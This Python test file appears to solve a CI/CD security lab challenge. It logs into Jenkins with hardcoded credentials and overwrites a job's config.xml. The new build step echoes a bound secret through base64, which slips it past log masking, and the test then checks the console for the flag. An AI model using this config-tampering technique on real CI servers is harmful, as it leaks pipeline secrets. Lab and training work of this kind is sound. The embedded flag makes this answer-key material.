from base64 import b64encode
from conftest import JenkinsClient, OWNER

CONFIG = """<project>
    <actions/>
    <description/>
    <keepDependencies>false</keepDependencies>
    <properties/>
    <scm class="hudson.plugins.git.GitSCM" plugin="git@4.10.0">
        <configVersion>2</configVersion>
        <userRemoteConfigs>
            <hudson.plugins.git.UserRemoteConfig>
                <url>http://gitea:3000/Wonderland/hearts.git</url>
            </hudson.plugins.git.UserRemoteConfig>
        </userRemoteConfigs>
        <branches>
            <hudson.plugins.git.BranchSpec>
                <name>main</name>
            </hudson.plugins.git.BranchSpec>
        </branches>
        <doGenerateSubmoduleConfigurations>false</doGenerateSubmoduleConfigurations>
        <submoduleCfg class="empty-list"/>
        <extensions/>
    </scm>
    <assignedNode>agent1</assignedNode>
    <canRoam>false</canRoam>
    <disabled>false</disabled>
    <blockBuildWhenDownstreamBuilding>false</blockBuildWhenDownstreamBuilding>
    <blockBuildWhenUpstreamBuilding>false</blockBuildWhenUpstreamBuilding>
    <triggers>
        <hudson.triggers.SCMTrigger>
            <spec>*/1 * * * *</spec>
            <ignorePostCommitHooks>false</ignorePostCommitHooks>
        </hudson.triggers.SCMTrigger>
    </triggers>
    <concurrentBuild>false</concurrentBuild>
    <builders>
        <hudson.tasks.Shell>
            <command>echo "$FLAG" | base64 </command>
            <configuredLocalRules/>
        </hudson.tasks.Shell>
    </builders>
    <publishers/>
    <buildWrappers>
        <org.jenkinsci.plugins.credentialsbinding.impl.SecretBuildWrapper plugin="credentials-binding@1.27">
            <bindings>
                <org.jenkinsci.plugins.credentialsbinding.impl.StringBinding>
                    <credentialsId>EC2-creds-flag8</credentialsId>
                    <variable>FLAG</variable>
                </org.jenkinsci.plugins.credentialsbinding.impl.StringBinding>
            </bindings>
        </org.jenkinsci.plugins.credentialsbinding.impl.SecretBuildWrapper>
    </buildWrappers>
</project>"""
REPO_NAME = 'hearts'
JOB_NAME = f'{OWNER.lower()}-{REPO_NAME}'


def test_hearts():
    jenkins_client = JenkinsClient('http://localhost:8080', username='knave', password='1sonic', useCrumb=True)
    jenkins_client.post('/job/wonderland-hearts/config.xml', data=CONFIG)
    flag = b64encode('B1A648E1-FD8B-4D66-8CAF-78114F55D396'.encode()).decode()
    assert jenkins_client.find_in_last_build_console(JOB_NAME, flag)
